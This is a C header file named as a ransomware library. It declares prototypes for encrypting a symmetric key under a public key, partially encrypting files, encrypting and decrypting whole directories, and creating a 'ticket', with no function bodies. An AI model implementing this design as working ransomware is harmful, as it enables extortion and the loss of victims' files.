/*
	Contains higher-level cryptographical functions
	(as opposed to crypt.h)
*/
#ifndef RANSOMLIB_HEADER
	#define RANSOMLIB_HEADER 1
	#include <stdbool.h>
	#include <stdint.h>
	int encryptSymmetricKey(char** encrypted_key, const int pubkeyid, const char* key);
	bool partialEncryptFile(const char* keyiv, const char* filename, int64_t number_of_bytes, bool decrypt);
	bool encryptDirectory(const char* keyiv, const char* directory);
	bool decryptDirectory(const char* keyiv, const char* directory);
	bool makeTicket(char** keyiv, const char* directory);
#endif